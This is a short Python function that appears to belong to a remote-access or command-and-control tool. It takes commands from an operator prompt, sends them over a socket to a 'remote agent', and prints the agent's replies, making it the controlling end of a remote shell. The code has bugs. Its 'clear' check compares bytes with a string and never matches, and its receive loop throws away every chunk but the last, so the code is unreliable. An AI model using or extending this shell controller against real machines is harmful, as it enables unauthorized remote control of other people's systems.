def shell(channel):
# Module to send a shell command to remote agent

    # Define a buffer size, 1024 bytes
    bufferSize = 1024

    try:
        # Read input command, with encode to convert string to bytes
        command = input(f"shell > ").encode()
        # If user want to clean console
        if command == 'clear':
            system('clear')
        # Else if command is empty, do nothing
        elif command == b'':
            pass
        else:
            # Else, send command to remote agent
            channel.sendall(command)

            # While True, receive data
            while True:
                rawResponse = channel.recv(bufferSize)
                # If all data are smaller than the buffer size, break While loop
                if len(rawResponse) < bufferSize:
                    break
            # Decode bytes to string to read the answer of the remote agent
            shellReponse = rawResponse.decode()
            # Print agent's answer
            print(shellReponse)

    except ConnectionResetError:
        print(f"\n[-] Channel reset by peer")
        return

    except BrokenPipeError:
        print(f"\n[-] Channel reset by peer (broken pipe)")
        return
